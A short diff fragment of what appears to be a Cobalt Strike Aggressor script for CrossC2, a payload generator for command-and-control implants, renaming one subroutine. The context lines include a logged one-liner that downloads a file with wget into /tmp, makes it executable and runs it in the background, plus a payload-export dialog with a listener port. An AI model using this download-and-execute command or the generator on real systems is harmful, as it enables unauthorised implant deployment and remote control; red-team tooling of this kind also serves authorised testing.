@@ -57,7 +57,7 @@ sub dialogCallBack {
     elog("wget " . $url . " -O /tmp/" . $targetSaveName . " && chmod a+x /tmp/" . $targetSaveName . " && /tmp/" . $targetSaveName . "&");
 }
 
-sub genCrossC22 {
+sub genCrossC2 {
     $dialog = dialog("CrossC2 Payload Generator", %(uri => "/a", lport => "55413", listener => "Listener: ", system => "System: ", arch => "Arch: ", payload_type => "Payload_Type: ", outputFileName => "/tmp/CrossC2-test"), &dialogCallBack);
     dialog_description($dialog, "Export CrossC2 Payload");
     drow_text($dialog, "uri", "URI Path: ", 20);
